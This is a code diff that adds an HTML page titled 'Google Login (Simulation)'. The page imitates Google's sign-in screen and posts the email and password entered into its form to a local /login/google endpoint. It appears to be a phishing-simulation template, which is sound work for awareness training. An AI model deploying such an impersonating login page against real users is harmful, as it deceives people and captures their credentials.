@@ -1,0 +1,39 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Google Login (Simulation)</title>
+    <link rel="stylesheet" href="./style/google-style.css" />
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="logo">
+        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span
+        ><span>e</span>
+      </div>
+
+      <h2>Sign in</h2>
+
+      <form action="/login/google" method="POST">
+        <input type="text" name="email" placeholder="Email or phone" required />
+
+        <input
+          type="password"
+          name="password"
+          placeholder="Enter your password"
+          required
+        />
+
+        <button type="submit">Next</button>
+      </form>
+
+      <div class="links">
+        <a href="#">Forgot email?</a>
+      </div>
+
+      <div class="bottom">
+        Not your computer? Use Guest mode to sign in privately.
+      </div>
+    </div>
+  </body>
+</html>
